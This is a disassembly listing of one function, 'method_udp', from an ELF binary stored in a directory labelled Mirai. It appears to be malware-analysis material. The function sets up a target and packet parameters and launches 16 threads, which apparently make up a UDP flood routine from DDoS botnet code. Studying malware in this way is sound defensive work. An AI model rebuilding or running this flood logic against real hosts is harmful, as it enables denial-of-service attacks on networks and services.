
/Users/taogoldi/Projects/malware/Mirai/input/d40cf9c95dcedf4f19e4a5f5bb744c8e98af87eb5703c850e6fda3b613668c28.elf:	file format elf64-x86-64

Disassembly of section .text:

0000000000401380 <method_udp>:
  401380: 41 56                        	push	r14
  401382: 41 89 d6                     	mov	r14d, edx
  401385: 41 55                        	push	r13
  401387: 41 54                        	push	r12
  401389: 41 89 f4                     	mov	r12d, esi
  40138c: 55                           	push	rbp
  40138d: 48 89 fd                     	mov	rbp, rdi
  401390: 53                           	push	rbx
  401391: 89 cb                        	mov	ebx, ecx
  401393: 8d 43 ff                     	lea	eax, [rbx - 0x1]
  401396: 48 81 ec d0 00 00 00         	sub	rsp, 0xd0
  40139d: 3d e2 ff 00 00               	cmp	eax, 0xffe2
  4013a2: 76 21                        	jbe	0x4013c5 <method_udp+0x45>
  4013a4: be e3 ff 00 00               	mov	esi, 0xffe3
  4013a9: bf c8 4c 41 00               	mov	edi, 0x414cc8
  4013ae: 31 c0                        	xor	eax, eax
  4013b0: e8 1b 6b 00 00               	call	0x407ed0 <printf>
  4013b5: 48 81 c4 d0 00 00 00         	add	rsp, 0xd0
  4013bc: 5b                           	pop	rbx
  4013bd: 5d                           	pop	rbp
  4013be: 41 5c                        	pop	r12
  4013c0: 41 5d                        	pop	r13
  4013c2: 41 5e                        	pop	r14
  4013c4: c3                           	ret
  4013c5: 4c 8d ac 24 80 00 00 00      	lea	r13, [rsp + 0x80]
  4013cd: ba 50 00 00 00               	mov	edx, 0x50
  4013d2: 31 f6                        	xor	esi, esi
  4013d4: 4c 89 ef                     	mov	rdi, r13
  4013d7: e8 44 87 00 00               	call	0x409b20 <memset>
  4013dc: 48 89 ee                     	mov	rsi, rbp
  4013df: ba 3f 00 00 00               	mov	edx, 0x3f
  4013e4: 4c 89 ef                     	mov	rdi, r13
  4013e7: 48 8d ac 24 80 00 00 00      	lea	rbp, [rsp + 0x80]
  4013ef: e8 70 89 00 00               	call	0x409d64 <strncpy>
  4013f4: 44 89 a4 24 c0 00 00 00      	mov	dword ptr [rsp + 0xc0], r12d
  4013fc: 89 9c 24 c8 00 00 00         	mov	dword ptr [rsp + 0xc8], ebx
  401403: 49 89 e4                     	mov	r12, rsp
  401406: 44 89 b4 24 c4 00 00 00      	mov	dword ptr [rsp + 0xc4], r14d
  40140e: c6 84 24 cc 00 00 00 aa      	mov	byte ptr [rsp + 0xcc], -0x56
  401416: 48 89 e3                     	mov	rbx, rsp
  401419: 66 66 66 90                  	nop
  40141d: 66 66 90                     	nop
  401420: 31 f6                        	xor	esi, esi
  401422: 48 89 df                     	mov	rdi, rbx
  401425: 4c 89 e9                     	mov	rcx, r13
  401428: ba 70 17 40 00               	mov	edx, 0x401770
  40142d: 48 83 c3 08                  	add	rbx, 0x8
  401431: e8 ba 46 00 00               	call	0x405af0 <pthread_create>
  401436: 48 39 eb                     	cmp	rbx, rbp
  401439: 75 e5                        	jne	0x401420 <method_udp+0xa0>
  40143b: 31 db                        	xor	ebx, ebx
  40143d: 66 66 90                     	nop
  401440: 49 8b 3c dc                  	mov	rdi, qword ptr [r12 + 8*rbx]
  401444: 31 f6                        	xor	esi, esi
  401446: 48 ff c3                     	inc	rbx
  401449: e8 6d 16 00 00               	call	0x402abb <pthread_join>
  40144e: 48 83 fb 10                  	cmp	rbx, 0x10
  401452: 75 ec                        	jne	0x401440 <method_udp+0xc0>
  401454: bf 95 50 41 00               	mov	edi, 0x415095
  401459: e8 ee 69 00 00               	call	0x407e4c <puts>
  40145e: 48 81 c4 d0 00 00 00         	add	rsp, 0xd0
  401465: 5b                           	pop	rbx
  401466: 5d                           	pop	rbp
  401467: 41 5c                        	pop	r12
  401469: 41 5d                        	pop	r13
  40146b: 41 5e                        	pop	r14
  40146d: c3                           	ret
  40146e: 66 90                        	nop
